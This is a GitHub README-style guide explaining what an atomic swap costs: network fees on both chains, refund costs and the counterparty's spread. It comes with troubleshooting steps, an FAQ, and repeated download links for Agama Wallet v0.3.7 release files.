[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Atomic Swap Fees: What a Cross-Chain Trade Costs

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

An atomic swap costs network fees on both chains and, according to the maker of Agama Wallet, no platform fee: the site states that neither Agama nor BarterDEX charges one and that only blockchain network fees apply. What that leaves is a cost that depends on the chains involved, their congestion at the moment of the trade, and how many transactions each side must send.

## You'll see this if

A swap quote shows a cost that looks unrelated to the amount being traded, or the received amount is smaller than expected and no line item explains the difference.

| Cost | Who charges it | Depends on |
|---|---|---|
| Network fee, first leg | The chain being spent from | Transaction size and current congestion |
| Network fee, claim | The chain receiving the asset | Whether the claim confirms promptly |
| Network fee, refund (if needed) | The chain holding the lock | Only if a deadline passes |
| Platform fee | Nobody, per the maker's description |  -  |
| Spread against market price | The counterparty's asking price | Liquidity and pair |

The last row is the one people miss. A swap has no platform fee, and the price can still be worse than a venue's because the counterparty sets it.

## Why it happens

A swap is not one transaction. Each side locks funds, and each side claims; a failed trade adds a refund on top. So the cost is at least two transactions per participant, four across the trade, and more when something goes wrong.

Fees on a UTXO chain scale with transaction size, which is why a wallet full of small outputs makes a swap more expensive than the same value held in one output. On an account chain the fee depends on the operation and the current demand for block space. Neither chain consults the other, so the two costs are unrelated and can differ by orders of magnitude.

The maker's own guidance names KMD/BTC, LTC/BTC and KMD/LTC as the deepest pairs and advises checking the order book before trading, which is also the practical answer to spread: a thin book means a worse price.

## Fix

Work out the real cost before committing, not after.

1. **Add up the network fees for every transaction you will send.** Lock and claim at minimum; refund only if the trade fails.
2. **Check both chains' current conditions.** A quiet chain and a busy one produce very different totals.
3. **Look at the rate, not just the fee.** Compare the quoted rate with a reference price you trust; the difference is the true cost of the trade.
4. **Check the pair's liquidity.** A thin pair widens the spread even when network fees are tiny.
5. **Keep a fee buffer on both chains.** A claim that cannot pay its fee is a claim that waits, and waiting can outlast a deadline.

If the total looks wrong, the cause is usually step 3 rather than step 1: network fees are visible and small, while the spread is invisible and larger.

## If that did not work

If the received amount is short by an amount that matches no fee you were quoted, compare the executed rate with the rate at the time you committed. Price movement between quote and settlement is the usual explanation.

If a claim fails for insufficient fee, the locked funds are not lost; the transaction simply was not broadcast successfully. Rebuild it with a higher fee while the deadline allows.

If a refund costs more than the amount locked, that is arithmetic, not a fault: a small output can be uneconomic to reclaim. The remedy is to avoid locking amounts that are small relative to the fees on that chain.

If a service advertises "zero fees" for a swap, check whether the cost has moved into the rate. There is no way to move value between two chains without paying both chains, and [are atomic swaps safe](https://github.com/agama-wallet/atomic-swaps/blob/main/are-they-safe.md) covers the rest of what a cheap trade can cost.

## Prevention

- **Trade amounts that are large relative to the fees.** A swap of a tiny amount is dominated by fixed costs.
- **Keep outputs consolidated on the spending side.** Fewer inputs means a smaller transaction and a smaller fee.
- **Compare the quoted rate before committing.** It is the number that decides whether the trade is worth doing.
- **Leave a buffer on both chains for the claim.** [How atomic swaps work](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md) shows where each transaction falls.
- **Do not treat a failed trade as free.** The lock and the refund are both transactions, and both cost.

## FAQ

### Does Agama Wallet charge a fee for swaps?

The maker states that it does not, and that neither Agama nor BarterDEX charges a platform fee, leaving only network fees. That is the site's position rather than an independently verified fact.

### Why did my swap cost more than the quoted fee?

Because the quote usually covers network fees, not the spread. The rate you accept includes the counterparty's margin, which is not a fee line.

### Who pays the network fees on each side?

Each party pays for the transactions it sends on its own chain. That is why both sides need a balance in each chain's native asset.

### Does the spread count as a fee?

Economically yes, and it is usually the larger cost. A swap has no platform fee by the maker's description, but the rate you accept includes the counterparty's margin. Comparing the quoted rate with a reference price is the only way to see it.

### Are swaps cheaper than exchange trading?

Not necessarily. An exchange charges a trading fee and a withdrawal fee; a swap charges network fees on two chains plus a spread. Which is cheaper depends on the amount and the chains.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
- [How Atomic Swaps Work, Step by Step](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md)
- [When an Atomic Swap Fails: Timeouts and Refunds](https://github.com/agama-wallet/atomic-swaps/blob/main/timeouts-and-refunds.md)
- [Atomic Swaps vs Bridges: Two Ways to Move Value Across Chains](https://github.com/agama-wallet/atomic-swaps/blob/main/bridges-and-their-tradeoffs.md)
